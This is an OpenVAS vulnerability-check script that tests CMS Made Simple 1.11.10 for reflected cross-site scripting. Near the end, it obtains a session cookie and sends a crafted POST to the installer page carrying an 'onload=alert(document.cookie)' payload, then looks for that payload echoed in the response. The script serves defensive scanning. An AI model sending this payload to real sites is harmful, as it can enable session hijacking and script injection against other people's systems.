###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cms_made_simple_mult_xss_vuln_mar14.nasl 3522 2016-06-15 12:39:54Z benallard $
#
# CMS Made Simple Multiple XSS Vulnerabilities Mar14
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804327";
CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3522 $");
  script_cve_id("CVE-2014-0334", "CVE-2014-2092");
  script_bugtraq_id(65746, 65898);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-15 14:39:54 +0200 (Wed, 15 Jun 2016) $");
  script_tag(name:"creation_date", value:"2014-03-18 13:06:25 +0530 (Tue, 18 Mar 2014)");
  script_name("CMS Made Simple Multiple XSS Vulnerabilities Mar14");

  tag_summary =
"The host is installed with CMS Made Simple and is prone to multiple
xss vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is vulnerable
or not.";

  tag_insight =
"Multiple flaws exist due to improper validation of user supplied input to
'editevent.php', 'pagedefaults.php', 'adminlog.php', 'myaccount.php',
'siteprefs.php', 'addbookmark.php', 'index.php', 'editorFrame.php',
'addhtmlblob.php', 'addtemplate.php', 'addcss.php' scripts.
For more information about the vulnerabilities refer the reference links.";

  tag_impact =
"Successful exploitation will allow remote attackers to execute arbitrary HTML
or script code, steal cookie-based authentication credentials and launch
other attacks.

Impact Level: Application";

  tag_affected =
"CMS Made Simple version 1.11.10, Other versions may also be affected.";

  tag_solution =
"No Solution or patch is available as of 11th March, 2014. Information
regarding this issue will updated once the solution details are available.
For updates refer to http://www.cmsmadesimple.org";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/526062");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125353/CMSMadeSimple-1.11.10-Cross-Site-Scripting.html");
  script_summary("Check if cmsmadesimple is vulnerable to xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("cms_made_simple_detect.nasl");
  script_mandatory_keys("cmsmadesimple/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
cmsReq = "";
cmsRes = "";
dir= "";
host= "";
cookie= "";

## Get CMSMadeSimple Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get CMSMadeSimple Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Extract Cookie
url = dir + "/install/index.php";

cmsRes = http_get(item:url,port:http_port);
cmsRes = http_keepalive_send_recv(port:http_port, data:cmsRes, bodyonly:FALSE);
if(!cmsRes){
  exit(0);
}

cookie = eregmatch(pattern:"Set-Cookie: PHPSESSID=([a-z0-9]+)", string:cmsRes);

if(cookie)
{
  url = dir + "/install/index.php?sessiontest=1";
  postData = "default_cms_lang='%3e" +
             '"%3e%3cbody%2fonload%3dalert(document.cookie)%3e&submit=Submit';

  ## Construct the POST data with the crafted request
  cmsReq = string("POST ",url," HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Cookie: PHPSESSID=",cookie[1],"\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),"\r\n",
               "\r\n",
               postData);
  ## Send the crafted request and receive the response
  cmsRes = http_keepalive_send_recv(port:http_port, data:cmsReq, bodyonly:TRUE);
  if(cmsRes =~ "HTTP/1\.. 200" && "onload=alert(document.cookie)>" >< cmsRes &&
      ">CMS Made Simple" >< cmsRes)
  {
    security_message(http_port);
    exit(0);
  }
}
